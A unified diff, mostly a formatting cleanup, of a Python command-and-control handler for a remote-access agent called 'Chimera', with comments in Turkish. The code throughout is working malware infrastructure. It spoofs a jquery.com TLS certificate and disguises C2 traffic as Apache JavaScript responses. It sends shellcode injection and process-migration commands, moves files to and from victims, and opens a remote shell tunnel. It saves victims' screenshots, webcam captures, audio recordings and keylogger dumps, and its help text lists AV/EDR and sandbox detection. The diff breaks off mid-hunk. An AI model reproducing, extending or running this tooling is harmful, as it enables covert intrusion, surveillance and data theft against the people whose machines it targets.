@@ -3,30 +3,36 @@ Chimera Multi-Handler Class
 Mevcut exploit/multi/handler mimarisine uygun özel handler sınıfı.
 Gelecekteki C2 (AES-256-GCM / ECDH) protokolüne hazırlık içerir.
 """
+
+import base64
+import contextlib
+import os
+import socket
+import ssl
+import struct
+import subprocess
+import sys
+import threading
+import time
+from datetime import datetime
+from typing import Any
+
+from rich import print
+
 from core.handler import BaseHandler
 from core.shared_state import shared_state
-import socket
-import threading
-import struct
-import time
-import ssl
-import os
-import subprocess
-import base64
-import sys
-from datetime import datetime
-from rich import print
-from typing import Dict, Any, Tuple
 
 # Sertifika dosyaları için yollar
 CERT_FILE = "server.crt"
 KEY_FILE = "server.key"
 
+
 class Handler(BaseHandler):
     """
     Chimera Agent için özel handler sınıfı.
     """
-    def __init__(self, options: Dict[str, Any]):
+
+    def __init__(self, options: dict[str, Any]):
         super().__init__(options)
         self.session_id = None
         self.cert_file = os.path.abspath(options.get("CERT_FILE", CERT_FILE))
@@ -39,12 +45,12 @@ class Handler(BaseHandler):
             print(f"[*] SSL Sertifikası oluşturuluyor... ({self.cert_file})")
             try:
                 subprocess.check_call(
-                    f'openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 '
+                    f"openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 "
                     f'-keyout "{self.key_file}" -out "{self.cert_file}" '
                     f'-subj "/C=US/ST=California/L=San Francisco/O=jQuery Inc/CN=jquery.com"',
                     shell=True,
                     stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL
+                    stderr=subprocess.DEVNULL,
                 )
                 print("[+] Sertifika oluşturuldu.")
             except Exception as e:
@@ -62,33 +68,35 @@ class Handler(BaseHandler):
             self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.sock.bind((self.lhost, self.lport))
             self.sock.listen(5)
-            
+
             self.running = True
             print(f"[*] Dinleniyor: {self.lhost}:{self.lport} (Çıkmak için CTRL+C)")
-            
+
             while self.running:
                 try:
                     client_sock, client_addr = self.sock.accept()
                     print(f"[+] Bağlantı geldi: {client_addr[0]}:{client_addr[1]}")
-                    
+
                     session_id = None
                     if shared_state.session_manager:
                         connection_info = {
                             "host": client_addr[0],
                             "port": client_addr[1],
-                            "type": "Chimera"
+                            "type": "Chimera",
                         }
-                        session_id = shared_state.session_manager.add_session(self, connection_info)
+                        session_id = shared_state.session_manager.add_session(
+                            self, connection_info
+                        )
                         print(f"[*] Oturum açıldı: Session {session_id}")
 
                     self.handle_connection(client_sock, session_id)
-                    
+
                 except KeyboardInterrupt:
                     raise
                 except Exception as e:
                     if self.running:
                         print(f"[!] Bağlantı kabul hatası: {e}")
-                        
+
         except KeyboardInterrupt:
             print("\n[*] Dinleyici durduruluyor...")
         except Exception as e:
@@ -96,52 +104,60 @@ class Handler(BaseHandler):
         finally:
             self.stop()
 
-    def handle_connection(self, client_sock: socket.socket, session_id: int = None):
+    def handle_connection(
+        self, client_sock: socket.socket, session_id: int | None = None
+    ):
         """
         Yeni gelen bağlantıyı karşılar ve yönetir.
         """
         self.client_sock = client_sock
         self.session_id = session_id
-        
-        print(f"[*] Chimera Handler: Yeni bağlantı kabul edildi. (Session: {session_id})")
+
+        print(
+            f"[*] Chimera Handler: Yeni bağlantı kabul edildi. (Session: {session_id})"
+        )
 
         # 1. SSL/TLS Handshake (C2 Encryption)
         try:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
             context.load_cert_chain(certfile=self.cert_file, keyfile=self.key_file)
-            
+
             # AES-256-GCM / ECDH kullanımını teşvik et
             # Modern SSL varsayılanları genellikle bunu yapar ama biz yine de belirtelim
             try:
-                context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
+                context.set_ciphers(
+                    "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384"
+                )
             except Exception:
-                pass # Sistem desteklemiyorsa varsayılanları kullan
+                pass  # Sistem desteklemiyorsa varsayılanları kullan
 
             self.client_sock = context.wrap_socket(client_sock, server_side=True)
             cipher = self.client_sock.cipher()
-            print(f"[*] Şifreli Bağlantı Kuruldu: {cipher[0]} ({cipher[1]} bit) - {cipher[2]}")
-            
+            print(
+                f"[*] Şifreli Bağlantı Kuruldu: {cipher[0]} ({cipher[1]} bit) - {cipher[2]}"
+            )
+
         except Exception as e:
             print(f"[!] SSL Handshake Hatası: {e}")
             return
 
         # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
-        
+
         # 2. Ajan Kimlik Doğrulaması / Sistem Bilgisi Alma
         try:
             # İlk mesajın sysinfo olmasını bekliyoruz
             sysinfo = self.recv_data()
             if sysinfo:
                 print(f"[+] Ajan Bilgisi: {sysinfo}")
-                
+
                 # Session manager'daki bilgiyi güncelle (Opsiyonel)
                 if shared_state.session_manager and self.session_id:
-                     session = shared_state.session_manager.get_session(self.session_id)
-                     if session:
-                         # Extra info olarak ekle
-                         session["info"]["extra"] = sysinfo
-                         # Session tipini güncelle
-                         session["type"] = "Chimera"
+                    session = shared_state.session_manager.get_session(self.session_id)
+                    if session:
+                        # Extra info olarak ekle
+                        session["info"]["extra"] = sysinfo
+                        # Session tipini güncelle
+                        session["type"] = "Chimera"
 
         except Exception as e:
             print(f"[!] Handshake hatası: {e}")
@@ -150,19 +166,26 @@ class Handler(BaseHandler):
         # 3. Arka plan / Ön plan etkileşimi
         # MultiHandler her zaman thread açar ve (gerekirse) main thread'den 'interact' çağrısı yapar.
         # Biz burada sadece soket bağlantısını tutmakla yükümlüyüz.
-        background = str(self.options.get("BACKGROUND", "false")).lower() in ['true', '1', 'yes', 'y']
-        
+        background = str(self.options.get("BACKGROUND", "false")).lower() in [
+            "true",
+            "1",
+            "yes",
+            "y",
+        ]
+
         if background:
-            session_pid = None
             if self.session_id and shared_state.session_manager:
                 session = shared_state.session_manager.get_session(self.session_id)
                 # Session içindeki sysinfo'dan PID'yi parse etmeye çalışabiliriz, veya ekrana sadece Thread/Session ID basabiliriz
-                print(f"[*] Chimera Session {self.session_id} arka planda açıldı. (PID: {threading.get_ident()})")
+                print(
+                    f"[*] Chimera Session {self.session_id} arka planda açıldı. (PID: {threading.get_ident()})"
+                )
             else:
-                print(f"[*] Chimera Session {self.session_id} arka planda açıldı. (PID: {threading.get_ident()})")
+                print(
+                    f"[*] Chimera Session {self.session_id} arka planda açıldı. (PID: {threading.get_ident()})"
+                )
             print(f"[*] Etkileşim için 'sessions -i {self.session_id}' kullanın.\n")
 
-            
         # Soket kapanmasın diye bekle
         try:
             while getattr(self, "running", True) and self.client_sock:
@@ -177,67 +200,70 @@ class Handler(BaseHandler):
         """
         self.interactive_session()
 
-
     def send_data(self, data: str):
         """HTTP Response olarak şifreli veri gönderir."""
-        if not self.client_sock: return
+        if not self.client_sock:
+            return
         try:
-            encoded_body = data.encode('utf-8')
-            
+            encoded_body = data.encode("utf-8")
+
             # HTTP Response Oluştur (Obfuscation)
             http_response = (
                 b"HTTP/1.1 200 OK\r\n"
                 b"Server: Apache/2.4.41 (Ubuntu)\r\n"
-                b"Date: " + time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()).encode() + b"\r\n"
+                b"Date: "
+                + time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime()).encode()
+                + b"\r\n"
                 b"Content-Type: application/javascript; charset=utf-8\r\n"
                 b"Content-Length: " + str(len(encoded_body)).encode() + b"\r\n"
                 b"Connection: keep-alive\r\n"
                 b"\r\n"
             )
-            
+
             self.client_sock.sendall(http_response + encoded_body)
         except Exception as e:
             print(f"[!] Veri gönderme hatası: {e}")
 
     def recv_data(self) -> str:
         """HTTP Request içinden veriyi okur."""
-        if not self.client_sock: return ""
+        if not self.client_sock:
+            return ""
         try:
             # Headerları oku (\r\n\r\n bulana kadar)
             header_buffer = b""
             while b"\r\n\r\n" not in header_buffer:
                 chunk = self.client_sock.recv(1)
-                if not chunk: return ""
+                if not chunk:
+                    return ""
                 header_buffer += chunk
-            
+
             # Content-Length bul
-            headers = header_buffer.decode('utf-8', errors='ignore')
+            headers = header_buffer.decode("utf-8", errors="ignore")
             content_length = 0
-            for line in headers.split('\r\n'):
-                if line.lower().startswith('content-length:'):
-                    try:
-                        content_length = int(line.split(':')[1].strip())
-                    except:
-                        pass
-            
+            for line in headers.split("\r\n"):
+                if line.lower().startswith("content-length:"):
+                    with contextlib.suppress(BaseException):
+                        content_length = int(line.split(":")[1].strip())
+
             # Body'yi oku
             body = b""
             while len(body) < content_length:
                 chunk = self.client_sock.recv(content_length - len(body))
-                if not chunk: break
+                if not chunk:
+                    break
                 body += chunk
-                
-            return body.decode('utf-8')
+
+            return body.decode("utf-8")
         except Exception as e:
             print(f"[!] Veri alma hatası: {e}")
             return ""
 
     def start_shell_mode(self, tunnel_port: int):
         """Ayrı TCP tüneli üzerinden shell etkileşimini yönetir.
-        
+
         Agent tarafında açılan shell tüneline bağlanır, raw I/O yapar.
         Shell kapanınca sadece tünel soketi kapatılır; C2 bağlantısı korunur.
-        
+
         Args:
             tunnel_port: Agent'ın açtığı shell tüneli port numarası.
         """
@@ -245,7 +271,7 @@ class Handler(BaseHandler):
         print("[*] Raw Shell Moduna geçildi (Ayrı Tünel).")
         print("[*] Çıkış için 'exit' yazıp Enter'layın.")
         print("-" * 50)
-        
+
         # ── 1. Agent'ın shell tüneline bağlan ──────────────────────
         # Agent'ın IP adresi = mevcut C2 bağlantısındaki peer
         try:
@@ -262,86 +288,86 @@ class Handler(BaseHandler):
         except Exception as e:
             print(f"[!] Shell tüneline bağlanılamadı: {e}")
             return
-        
+
         # ── 2. Raw I/O: shell_sock ↔ kullanıcı terminal ───────────
         stop_event = threading.Event()
-        
+
         def recv_loop():
             """Shell Socket -> STDOUT"""
             while not stop_event.is_set():
                 try:
-                    if not shell_sock: break
+                    if not shell_sock:
+                        break
                     data = shell_sock.recv(4096)
                     if not data:
                         stop_event.set()
                         break
-                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
+                    print(data.decode("utf-8", errors="replace"), end="", flush=True)
                 except Exception:
                     stop_event.set()
                     break
 
         t = threading.Thread(target=recv_loop, daemon=True)
         t.start()
-        
+
         try:
             while not stop_event.is_set():
                 try:
                     cmd = sys.stdin.readline()
                 except EOFError:
                     break
-                
-                if not cmd: break
-                
+
+                if not cmd:
+                    break
+
                 if cmd.strip() == "exit":
-                    try:
+                    with contextlib.suppress(BaseException):
                         shell_sock.send(b"exit_shell_mode_now")
-                    except:
-                        pass
                     stop_event.set()
                     break
-                
+
                 try:
-                    shell_sock.send(cmd.encode('utf-8'))
+                    shell_sock.send(cmd.encode("utf-8"))
                 except:
                     stop_event.set()
                     break
-                
+
         except KeyboardInterrupt:
-            try:
+            with contextlib.suppress(BaseException):
                 shell_sock.send(b"exit_shell_mode_now")
-            except:
-                pass
             stop_event.set()
 
         # ── 3. Temizlik — sadece shell soketini kapat ─────────────
         print("\n[*] Shell modundan çıkıldı.")
-        try:
+        with contextlib.suppress(BaseException):
             shell_sock.close()
-        except:
-            pass
-        
+
         # C2 bağlantısı (self.client_sock) DOKUNULMAZ
         # Session silinmez — chimera prompt'a doğrudan dönülür
-
 
     def interactive_session(self):
         """Basit interaktif komut satırı."""
         print("-" * 50)
-        print(f"[*] Chimera Session {self.session_id} aktif. Çıkmak için 'background' veya 'bg'.")
+        print(
+            f"[*] Chimera Session {self.session_id} aktif. Çıkmak için 'background' veya 'bg'."
+        )
         print("-" * 50)
-        
+
         while True:
             try:
                 cmd = input(f"chimera ({self.session_id}) > ")
-                if not cmd.strip(): continue
-                
+                if not cmd.strip():
+                    continue
+
                 # Kullanıcı yanlışlıkla kopyala-yapıştır yaparken "chimera (1) > " kısmını da alırsa temizle
                 import re
-                cmd = re.sub(r'^chimera\s*\(\d+\)\s*>\s*', '', cmd.strip())
-                if not cmd: continue
-                
+
+                cmd = re.sub(r"^chimera\s*\(\d+\)\s*>\s*", "", cmd.strip())
+                if not cmd:
+                    continue
+
                 cmd_lower = cmd.lower()
-                
+
                 if cmd_lower in ["exit", "quit"]:
                     # Session'ı kapat
                     print("[*] Bağlantı kapatılıyor...")
@@ -349,15 +375,17 @@ class Handler(BaseHandler):
                     if shared_state.session_manager and self.session_id:
                         with shared_state.session_manager.lock:
                             if self.session_id in shared_state.session_manager.sessions:
-                                del shared_state.session_manager.sessions[self.session_id]
+                                del shared_state.session_manager.sessions[
+                                    self.session_id
+                                ]
                     self.session_id = None
                     break
-                    
+
                 if cmd_lower in ["background", "bg"]:
                     # Arka plana at (Session açık kalır)
                     print(f"[*] Session {self.session_id} arka plana atıldı.")
                     break
-                
+
                 # Yardım komutu
                 if cmd_lower in ["help", "?"]:
                     help_text = """
@@ -373,7 +401,7 @@ class Handler(BaseHandler):
   sysinfo               - Detaylı sistem bilgisi (OS, IP, process, yetki)
   detect                - Ortam analizi (AV/EDR ve VM/Sandbox tespiti)
   pwd                   - Mevcut dizini göster
-  
+
 [Dosya İşlemleri]
   ls [path]             - Dizin içeriğini listele
   cd <path>             - Dizin değiştir
@@ -435,43 +463,51 @@ class Handler(BaseHandler):
                         if len(parts) < 2:
                             print("[!] Kullanım: loadmodule <local_file_path>")
                             continue
-                        
+
                         file_path = parts[1].strip()
                         if not os.path.exists(file_path):
                             print(f"[!] Dosya bulunamadı: {file_path}")
                             continue
-                        
+
                         # Dosyayı oku ve encode et
                         with open(file_path, "rb") as f:
                             file_content = f.read()
-                            b64_content = base64.b64encode(file_content).decode('utf-8')
-                        
+                            b64_content = base64.b64encode(file_content).decode("utf-8")
+
                         # Dosya adından modül adı türet (uzantısız)
                         filename = os.path.basename(file_path)
                         module_name = os.path.splitext(filename)[0]
-                        
+
                         # Yeni komutu hazırla
-                        print(f"[*] Modül gönderiliyor: {module_name} ({len(file_content)} bytes)")
+                        print(
+                            f"[*] Modül gönderiliyor: {module_name} ({len(file_content)} bytes)"
+                        )
                         cmd = f"loadmodule {module_name} {b64_content}"
-                        
+
                     except Exception as e:
-                        print(f"[!] Modül hazırlama hatası: {str(e)}")
+                        print(f"[!] Modül hazırlama hatası: {e!s}")
                         continue
 
                 # Process Injection: Shellcode dosyasını oku ve enjekte et
                 # Kullanım: inject_shellcode <PID> <local_shellcode_file>
-                if cmd_lower.startswith("inject_shellcode ") or cmd_lower.startswith("inject_shellcode_nt "):
+                if cmd_lower.startswith("inject_shellcode ") or cmd_lower.startswith(
+                    "inject_shellcode_nt "
+                ):
                     try:
                         use_nt = cmd_lower.startswith("inject_shellcode_nt ")
-                        prefix = "inject_shellcode_nt " if use_nt else "inject_shellcode "
-                        rest   = cmd[len(prefix):].strip().split(None, 1)
+                        prefix = (
+                            "inject_shellcode_nt " if use_nt else "inject_shellcode "
+                        )
+                        rest = cmd[len(prefix) :].strip().split(None, 1)
 
                         if len(rest) < 2:
-                            print(f"[!] Kullanım: {prefix.strip()} <PID> <local_shellcode_file>")
+                            print(
+                                f"[!] Kullanım: {prefix.strip()} <PID> <local_shellcode_file>"
+                            )
                             continue
 
-                        target_pid    = rest[0]
-                        sc_file_path  = rest[1].strip()
+                        target_pid = rest[0]
+                        sc_file_path = rest[1].strip()
 
                         if not os.path.exists(sc_file_path):
                             print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
@@ -481,22 +517,26 @@ class Handler(BaseHandler):
                             sc_bytes = _f.read()
 
                         b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
-                        print(f"[*] Shellcode yükleniyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")
+                        print(
+                            f"[*] Shellcode yükleniyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}"
+                        )
 
                         nt_prefix = "nt:" if use_nt else ""
                         cmd = f"inject_shellcode_b64 {target_pid} {nt_prefix}{b64_sc}"
 
                     except Exception as e:
-                        print(f"[!] Inject hazırlık hatası: {str(e)}")
+                        print(f"[!] Inject hazırlık hatası: {e!s}")
                         continue
 
                 # inject_migrate <PID> [local_shellcode_file]
                 if cmd_lower.startswith("inject_migrate "):
                     try:
-                        rest = cmd[len("inject_migrate "):].strip().split(None, 1)
+                        rest = cmd[len("inject_migrate ") :].strip().split(None, 1)
 
                         if not rest:
-                            print("[!] Kullanım: inject_migrate <PID> [local_shellcode_file]")
+                            print(
+                                "[!] Kullanım: inject_migrate <PID> [local_shellcode_file]"
+                            )
                             continue
 
                         target_pid = rest[0]
@@ -504,20 +544,24 @@ class Handler(BaseHandler):
                         if len(rest) == 2:
                             sc_file_path = rest[1].strip()
                             if not os.path.exists(sc_file_path):
-                                print(f"[!] Shellcode dosyası bulunamadı: {sc_file_path}")
+                                print(
+                                    f"[!] Shellcode dosyası bulunamadı: {sc_file_path}"
+                                )
                                 continue
 
                             with open(sc_file_path, "rb") as _f:
                                 sc_bytes = _f.read()
 
                             b64_sc = base64.b64encode(sc_bytes).decode("utf-8")
-                            print(f"[*] Migration shellcode hazırlanıyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}")
+                            print(
+                                f"[*] Migration shellcode hazırlanıyor: {sc_file_path} ({len(sc_bytes)} bytes) → PID {target_pid}"
+                            )
                             cmd = f"inject_migrate {target_pid} {b64_sc}"
                         else:
                             cmd = f"inject_migrate {target_pid}"
 
                     except Exception as e:
-                        print(f"[!] inject_migrate hazırlık hatası: {str(e)}")
+                        print(f"[!] inject_migrate hazırlık hatası: {e!s}")
                         continue
 
                 # Dosya Yükleme: Yerel dosyayı uzak sisteme transfer et
@@ -527,45 +571,59 @@ class Handler(BaseHandler):
                         if len(parts) < 2:
                             print("[!] Kullanım: upload <local_path> [remote_path]")
                             continue
-                        
+
                         local_path = parts[1]
-                        remote_path = parts[2] if len(parts) > 2 else os.path.basename(local_path)
-                        
+                        remote_path = (
+                            parts[2] if len(parts) > 2 else os.path.basename(local_path)
+                        )
+
                         if not os.path.exists(local_path):
                             print(f"[!] Dosya bulunamadı: {local_path}")
                             continue
-                            
+
                         file_size = os.path.getsize(local_path)
-                        chunk_size = 512 * 1024 # 512 KB
-                        print(f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({file_size} bytes)")
-                        
+                        chunk_size = 512 * 1024  # 512 KB
+                        print(
+                            f"[*] Dosya yükleniyor: {local_path} -> {remote_path} ({file_size} bytes)"
+                        )
+
                         with open(local_path, "rb") as f:
                             offset = 0
                             while offset < file_size or file_size == 0:
                                 chunk_data = f.read(chunk_size)
                                 if not chunk_data and file_size > 0:
                                     break
-                                
-                                b64_content = base64.b64encode(chunk_data).decode('utf-8')
-                                upload_cmd = f"upload_chunk {remote_path} {offset} {b64_content}"
+
+                                b64_content = base64.b64encode(chunk_data).decode(
+                                    "utf-8"
+                                )
+                                upload_cmd = (
+                                    f"upload_chunk {remote_path} {offset} {b64_content}"
+                                )
                                 self.send_data(upload_cmd)
                                 response = self.recv_data()
-                                
+
                                 if response and "[+]" in response:
                                     offset += len(chunk_data)
                                     if file_size > 0:
-                                        print(f"\r[*] İlerleme: {offset}/{file_size} bytes ({(offset/file_size)*100:.1f}%)", end="", flush=True)
+                                        print(
+                                            f"\r[*] İlerleme: {offset}/{file_size} bytes ({(offset / file_size) * 100:.1f}%)",
+                                            end="",
+                                            flush=True,
+                                        )
                                     if file_size == 0:
-                                        break # Empty file uploaded
+                                        break  # Empty file uploaded
                                 else:
-                                    print(f"\n[!] Yükleme hatası (offset {offset}): {response}")
+                                    print(
+                                        f"\n[!] Yükleme hatası (offset {offset}): {response}"
+                                    )
                                     break
                         if offset >= file_size:
                             print("\n[+] Dosya başarıyla yüklendi!")
                         continue
-                        
+
                     except Exception as e:
-                        print(f"[!] Upload hazırlık hatası: {str(e)}")
+                        print(f"[!] Upload hazırlık hatası: {e!s}")
                         continue
 
                 # Dosya İndirme (Chunked)
@@ -575,37 +633,57 @@ class Handler(BaseHandler):
                         if len(parts) < 2:
                             print("[!] Kullanım: download <remote_path> [local_path]")
                             continue
-                            
+
                         remote_path = parts[1]
-                        local_path = parts[2] if len(parts) > 2 else os.path.basename(remote_path)
-                        
+                        local_path = (
+                            parts[2]
+                            if len(parts) > 2
+                            else os.path.basename(remote_path)
+                        )
+
                         self.send_data(f"file_size {remote_path}")
                         resp = self.recv_data()
-                        
+
                         if resp and resp.startswith("FILE_SIZE_OK:"):
                             file_size = int(resp.split(":")[1])
-                            print(f"[*] Dosya indiriliyor: {remote_path} -> {local_path} ({file_size} bytes)")
-                            
-                            chunk_size = 512 * 1024 # 512KB
+                            print(
+                                f"[*] Dosya indiriliyor: {remote_path} -> {local_path} ({file_size} bytes)"
+                            )
+
+                            chunk_size = 512 * 1024  # 512KB
                             offset = 0
-                            
+
                             with open(local_path, "wb") as f:
                                 while offset < file_size or file_size == 0:
-                                    to_read = min(chunk_size, file_size - offset) if file_size > 0 else 0
-                                    self.send_data(f"download_chunk {remote_path} {offset} {to_read}")
+                                    to_read = (
+                                        min(chunk_size, file_size - offset)
+                                        if file_size > 0
+                                        else 0
+                                    )
+                                    self.send_data(
+                                        f"download_chunk {remote_path} {offset} {to_read}"
+                                    )
                                     chunk_resp = self.recv_data()
-                                    
-                                    if chunk_resp and chunk_resp.startswith("DOWNLOAD_CHUNK_OK:"):
+
+                                    if chunk_resp and chunk_resp.startswith(
+                                        "DOWNLOAD_CHUNK_OK:"
+                                    ):
                                         b64_data = chunk_resp.split(":", 1)[1]
                                         chunk_data = base64.b64decode(b64_data)
                                         f.write(chunk_data)
                                         offset += len(chunk_data)
                                         if file_size > 0:
-                                            print(f"\r[*] İlerleme: {offset}/{file_size} bytes ({(offset/file_size)*100:.1f}%)", end="", flush=True)
+                                            print(
+                                                f"\r[*] İlerleme: {offset}/{file_size} bytes ({(offset / file_size) * 100:.1f}%)",
+                                                end="",
+                                                flush=True,
+                                            )
                                         if file_size == 0:
                                             break
                                     else:
-                                        print(f"\n[!] İndirme hatası (offset {offset}): {chunk_resp}")
+                                        print(
+                                            f"\n[!] İndirme hatası (offset {offset}): {chunk_resp}"
+                                        )
                                         break
                                 if offset >= file_size:
                                     print("\n[+] Dosya başarıyla indirildi!")
@@ -613,7 +691,9 @@ class Handler(BaseHandler):
                             print(f"[!] Dosya boyutu alınamadı: {resp}")
                         else:
                             # Fallback if agent doesn't support file_size (Legacy download)
-                            print(f"[*] Chunked transfer desteklenmiyor, eski yöntem deneniyor...")
+                            print(
+                                "[*] Chunked transfer desteklenmiyor, eski yöntem deneniyor..."
+                            )
                             self.send_data(cmd)
                             response = self.recv_data()
                             if response and response.startswith("DOWNLOAD_OK:"):
@@ -621,12 +701,14 @@ class Handler(BaseHandler):
                                 file_content = base64.b64decode(b64_data)
                                 with open(local_path, "wb") as f:
                                     f.write(file_content)
-                                print(f"[+] Dosya başarıyla indirildi: {local_path} ({len(file_content)} bytes)")
+                                print(
+                                    f"[+] Dosya başarıyla indirildi: {local_path} ({len(file_content)} bytes)"
+                                )
                             else:
                                 print(f"[!] İndirme hatası: {response}")
                         continue
                     except Exception as e:
-                        print(f"[!] Download hazırlık hatası: {str(e)}")
+                        print(f"[!] Download hazırlık hatası: {e!s}")
                         continue
 
                 # Port Forwarding işlemleri (Handler yakalar ve ajana gönderir)
@@ -658,11 +740,13 @@ class Handler(BaseHandler):
                 if cmd_lower == "shell":
                     # Agent artık SHELL_TUNNEL:<port> yanıtı gönderiyor
                     response = self.recv_data()
-                    
+
                     if response and response.startswith("SHELL_TUNNEL:"):
                         try:
                             tunnel_port = int(response.split(":")[1])
-                            print(f"[+] Shell oturumu başlatıldı. (Tünel port: {tunnel_port})")
+                            print(
+                                f"[+] Shell oturumu başlatıldı. (Tünel port: {tunnel_port})"
+                            )
                             self.start_shell_mode(tunnel_port)
                             # Shell modundan dönünce C2 bağlantısı hâlâ ayakta
                             # Doğrudan chimera prompt'a dön
@@ -673,7 +757,7 @@ class Handler(BaseHandler):
                     else:
                         print("[!] Shell başlatma yanıtı alınamadı.")
                     continue
-                
+
                 # Normal komut cevabı bekle
                 response = self.recv_data()
                 if response:
@@ -683,153 +767,161 @@ class Handler(BaseHandler):
                             # Format: DOWNLOAD_OK:<base64>
                             b64_data = response.split(":", 1)[1]
                             file_content = base64.b64decode(b64_data)
-                            
+
                             # Dosya adını komuttan çıkarmaya çalış
                             # Orijinal komut: download <remote_path>
                             # Biz burada orijinal 'cmd' değişkenini kullanıyoruz ama 'cmd' overwrite edilmiş olabilir mi?
                             # Hayır, 'download' komutu upload bloğuna girmediği için 'cmd' orijinal halinde.
-                            
+
                             parts = cmd.split(" ")
                             if len(parts) >= 2:
                                 filename = os.path.basename(parts[1])
                             else:
                                 filename = f"downloaded_{int(time.time())}.bin"
-                                
+
                             # Varsa download klasörüne kaydet, yoksa current dir
                             save_path = os.path.join(os.getcwd(), filename)
-                            
+
                             with open(save_path, "wb") as f:
                                 f.write(file_content)
-                                
-                            print(f"[+] Dosya başarıyla indirildi: {save_path} ({len(file_content)} bytes)")
+
+                            print(
+                                f"[+] Dosya başarıyla indirildi: {save_path} ({len(file_content)} bytes)"
+                            )
                         except Exception as e:
-                            print(f"[!] Download kaydetme hatası: {str(e)}")
-                    
+                            print(f"[!] Download kaydetme hatası: {e!s}")
+
                     # Ekran Görüntüsü: Gelen screenshot verisini dosyaya kaydet
                     elif response.startswith("SCREENSHOT_OK:"):
                         try:
                             b64_data = response.split(":", 1)[1]
                             img_data = base64.b64decode(b64_data)
-                            
+
                             # screenshots klasörünü oluştur
                             screenshots_dir = os.path.join(os.getcwd(), "screenshots")
                             os.makedirs(screenshots_dir, exist_ok=True)
-                            
+
                             # Dosya formatını belirle (BMP veya PNG)
-                            if img_data[:2] == b'BM':
+                            if img_data[:2] == b"BM":
                                 ext = "bmp"
                             else:
                                 ext = "png"
-                            
+
                             # Timestamp ile dosya adı oluştur
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                            filename = f"screenshot_{timestamp}_session{self.session_id}.{ext}"
+                            filename = (
+                                f"screenshot_{timestamp}_session{self.session_id}.{ext}"
+                            )
                             save_path = os.path.join(screenshots_dir, filename)
-                            
+
                             with open(save_path, "wb") as f:
                                 f.write(img_data)
-                            
+
                             # Dosya boyutunu insan okunabilir formata çevir
                             size_kb = len(img_data) / 1024
                             if size_kb > 1024:
-                                size_str = f"{size_kb/1024:.2f} MB"
+                                size_str = f"{size_kb / 1024:.2f} MB"
                             else:
                                 size_str = f"{size_kb:.2f} KB"
-                            
-                            print(f"[+] 📸 Ekran görüntüsü kaydedildi!")
+
+                            print("[+] 📸 Ekran görüntüsü kaydedildi!")
                             print(f"    Dosya : {save_path}")
                             print(f"    Boyut : {size_str}")
                             print(f"    Format: {ext.upper()}")
                         except Exception as e:
-                            print(f"[!] Screenshot kaydetme hatası: {str(e)}")
+                            print(f"[!] Screenshot kaydetme hatası: {e!s}")
 
                     # Webcam Görüntüsü
                     elif response.startswith("WEBCAM_OK:"):
                         try:
                             b64_data = response.split(":", 1)[1]
                             img_data = base64.b64decode(b64_data)
-                            
+
                             media_dir = os.path.join(os.getcwd(), "media")
                             os.makedirs(media_dir, exist_ok=True)
-                            
+
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                            filename = f"webcam_{timestamp}_session{self.session_id}.jpeg"
+                            filename = (
+                                f"webcam_{timestamp}_session{self.session_id}.jpeg"
+                            )
                             save_path = os.path.join(media_dir, filename)
-                            
+
                             with open(save_path, "wb") as f:
                                 f.write(img_data)
-                                
-                            print(f"[+] 📷 Webcam görüntüsü kaydedildi!")
+
+                            print("[+] 📷 Webcam görüntüsü kaydedildi!")
                             print(f"    Dosya : {save_path}")
                         except Exception as e:
-                            print(f"[!] Webcam kaydetme hatası: {str(e)}")
+                            print(f"[!] Webcam kaydetme hatası: {e!s}")
 
                     # Ses Kaydı
                     elif response.startswith("AUDIO_OK:"):
                         try:
                             b64_data = response.split(":", 1)[1]
                             wav_data = base64.b64decode(b64_data)
-                            
+
                             media_dir = os.path.join(os.getcwd(), "media")
                             os.makedirs(media_dir, exist_ok=True)
-                            
+
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                             filename = f"audio_{timestamp}_session{self.session_id}.wav"
                             save_path = os.path.join(media_dir, filename)
-                            
+
                             with open(save_path, "wb") as f:
                                 f.write(wav_data)
-                                
-                            print(f"[+] 🎤 Ses kaydı kaydedildi!")
+
+                            print("[+] 🎤 Ses kaydı kaydedildi!")
                             print(f"    Dosya : {save_path}")
                         except Exception as e:
-                            print(f"[!] Ses kaydetme hatası: {str(e)}")
+                            print(f"[!] Ses kaydetme hatası: {e!s}")
 
                     # Keylogger Dökümü: Gelen logları kaydet
                     elif response.startswith("KEYLOG_DUMP:"):
                         try:
                             b64_logs = response.split(":", 1)[1]
-                            logs = base64.b64decode(b64_logs).decode('utf-8')
-                            
+                            logs = base64.b64decode(b64_logs).decode("utf-8")
+
                             # logs klasörünü oluştur
                             logs_dir = os.path.join(os.getcwd(), "logs")
                             os.makedirs(logs_dir, exist_ok=True)
-                            
+
                             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                            filename = f"keylog_{timestamp}_session{self.session_id}.txt"
+                            filename = (
+                                f"keylog_{timestamp}_session{self.session_id}.txt"
+                            )
                             save_path = os.path.join(logs_dir, filename)
-                            
+
                             with open(save_path, "w", encoding="utf-8") as f:
                                 f.write(logs)
-                                
-                            print(f"[+] ⌨️ Keylogger dökümü alındı!")
+
+                            print("[+] ⌨️ Keylogger dökümü alındı!")
                             print(f"    Dosya : {save_path}")
                             print(f"    Boyut : {len(logs)} karakter")
                             print("-" * 40)
                             # Ekrana da bas (kısaca)
-                            lines = logs.split('\n')
-                            print("\n".join(lines[:10])) # İlk 10 satırı göster
